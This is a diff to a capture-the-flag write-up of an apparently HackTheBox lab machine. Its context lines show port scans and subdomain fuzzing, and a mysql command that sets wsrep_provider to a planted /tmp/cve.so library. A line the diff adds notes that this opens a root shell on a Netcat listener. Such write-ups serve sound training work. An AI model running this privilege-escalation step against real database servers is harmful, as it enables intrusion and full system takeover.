@@ -13,7 +13,7 @@ PORT   STATE SERVICE VERSION
 |_http-title: FlexStart Bootstrap Template - Index
 ```
 
-UDP
+UDP:
 
 ```bash
 PORT    STATE SERVICE
@@ -29,11 +29,6 @@ ffuf -u http://10.10.11.124/ -H 'Host: FUZZ.shibboleth.htb' -w /usr/share/wordli
 # monitor                 [Status: 200, Size: 3686, Words: 192, Lines: 30, Duration: 64ms]
 # monitoring              [Status: 200, Size: 3686, Words: 192, Lines: 30, Duration: 68ms]
 # zabbix                  [Status: 200, Size: 3686, Words: 192, Lines: 30, Duration: 78ms]
-```
-
-Directories:
-
-```bash
 ```
 
 ## Admin on the Web Console
@@ -155,6 +150,8 @@ When setting a global variable to its path:
 mysql -h 127.0.0.1 -D zabbix -u zabbix -p'bloooarskybluh' \
     -e'SET GLOBAL wsrep_provider="/tmp/cve.so";'
 ```
+
+It opens a root shell on the listening Netcat.
 
 [author-profile]: https://app.hackthebox.com/users/8930
 
